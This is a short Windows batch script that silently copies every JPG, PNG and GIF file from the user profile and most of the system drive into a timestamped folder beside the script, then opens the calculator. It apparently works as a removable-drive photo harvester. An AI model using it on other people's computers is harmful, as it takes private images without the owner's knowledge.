set dirname=%date%_%time:~0,-3%
set dirname="%dirname::=-%"
mkdir "%dirname%\user"



robocopy %USERPROFILE%\ *.jpg *.jpeg *.png *.gif %dirname%\user\ 

for /d %%d in (%USERPROFILE%\*) do  robocopy %%d\ *.jpg *.jpeg *.png *.gif %dirname%\user\ /s


robocopy %SystemDrive%\ *.jpg *.jpeg *.png *.gif %dirname%\SystemDrive\ 

for   /d  %%d in (%SystemDrive%\* ) do (     if %%d NEQ %SystemRoot% if %%d NEQ %windir% if %%d NEQ %USERPROFILE%     robocopy %%d\ *.jpg *.jpeg *.png *.gif %dirname%\SystemDrive\ /s     )


set dirname=end_%time:~0,-3%
set dirname="%dirname::=-%"
mkdir "%dirname%"


calc

